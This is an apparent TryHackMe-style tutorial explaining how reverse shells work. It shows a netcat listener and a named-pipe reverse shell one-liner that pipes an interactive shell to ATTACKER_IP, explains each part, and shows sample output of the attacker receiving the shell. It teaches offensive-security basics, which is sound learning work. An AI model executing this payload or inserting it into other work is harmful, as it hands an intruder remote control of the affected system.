# Reverse Shell
A reverse shell, sometimes referred to as a "connect back shell," is one of the most popular techniques for gaining access to a system in cyberattacks. The connections initiate from the target system to the attacker's machine, which can help avoid detection from network firewalls and other security appliances.

## How Reverse Shells Work
**Set up a Netcat (nc) Listener**
Let's now understand how a reverse shell works in a practical scenario using the tool Netcat. This utility supports multiple OSs and allows reading and writing through a network.

As mentioned above, a reverse shell will connect back to the attacker's machine. This machine will be waiting for a connection, so let's use Netcat to listen to a connection using the following command **`nc -lvnp 443`**.
```bash
🔴🟢🟡                        Terminal
attacker@kali:~$ nc -lvnp 443
listening on [any] 4444 ...
```
```bash
nc -lvnp 443
```

The command above uses the **`-l`** option to indicate Netcat to listen or wait for a connection. The **`-v`** option enables verbose mode. The **`-n`** option prevents the connections from using DNS for lookup, so it will not resolve any hostname it will use an IP address. Finally, the **`-p`** flag indicates the port that will be used to wait for the connection, in the case above, port **443**.

Any port can be used to wait for a connection, but attackers and pentesters tend to use known ports used by other applications like **53, 80, 8080, 443, 139, or 445**. This is to blend the reverse shell with legitimate traffic and avoid detection by security appliances.

**Gaining Reverse Shell Access**
Once we have our listener set, the attacker should execute what is known as a reverse shell payload. This payload usually abuses the vulnerability or unauthorized access granted by the attacker and executes a command that will expose the shell through the network. There's a variety of payloads that will depend on the tools and OS of the compromised system. We can explore some of them here.

As an example, let's analyze an example payload named a pipe reverse shell, as shown below.

**`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f`**
**Explanation of the Payload**

**`rm -f /tmp/f`** - This command removes any existing named pipe file located at /tmp/f/. This ensures that the script can create a new named pipe without conflicts.  

**`mkfifo /tmp/f`** - This command creates a named pipe, or FIFO (first-in, first-out), at /tmp/f. Named pipes allow for two-way communication between processes. In this context, it acts as a conduit for input and output.  

**`cat /tmp/f`** - This command reads data from the named pipe. It waits for input that can be sent through the pipe.  

**`| bash -i 2>&1`** - The output of cat is piped to a shell instance (bash -i), which allows the attacker to execute commands interactively. The 2>&1 redirects standard error to standard output, ensuring that error messages are sent back to the attacker.  

**`| nc ATTACKER_IP ATTACKER_PORT >/tmp/f`** - This part pipes the shell's output through nc (Netcat) to the attacker's IP address (ATTACKER_IP) on the attacker's port (ATTACKER_PORT).  

**`>/tmp/f`** -This final part sends the output of the commands back into the named pipe, allowing for bi-directional communication.  
The payload above can expose the shell **`bash`** through the network to the desired listener.

**Attacker Receives the Shell**  
Once the above payload is executed, the attacker will receive a **reverse shell**, as shown below, allowing them to execute commands as if they were logging into a regular terminal in the OS.

**Attacker Terminal Output (Receiving Shell)**
```bash
🔴🟢🟡                        Terminal
attacker@kali:~$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.4.99.209] from (UNKNOWN) [10.10.13.37] 59964
To run a command as administrator (user "root"), use "sudo ".
See "man sudo_root" for details.

target@tryhackme:~$
```
The output above shows the connection coming from the IP **`10.10.13.37`**, which is the IP address of the compromised target.
